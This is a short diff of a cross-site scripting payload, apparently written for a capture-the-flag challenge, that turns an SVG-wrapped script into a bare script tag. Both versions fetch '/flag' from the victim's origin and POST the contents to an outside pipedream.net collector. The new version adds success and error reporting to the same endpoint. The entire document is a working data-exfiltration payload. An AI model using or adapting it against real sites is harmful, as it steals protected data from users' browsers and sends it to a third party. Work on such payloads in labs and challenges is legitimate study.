@@ -1,13 +1,19 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>
-    fetch('/flag')
-      .then(r => r.text())
-      .then(flag => {
-        fetch('https://eokqbbiypxqueat.m.pipedream.net', {
-          method: 'POST',
-          mode: 'no-cors',
-          body: flag
-        });
+<script>
+  fetch('/flag')
+    .then(r => r.text())
+    .then(flag => {
+      fetch('https://eokqbbiypxqueat.m.pipedream.net', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: 'SUCCESS: ' + flag
       });
-  </script>
-</svg>
+    })
+    .catch(e => {
+      fetch('https://eokqbbiypxqueat.m.pipedream.net', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: 'ERROR: ' + e
+      });
+    });
+</script>
+
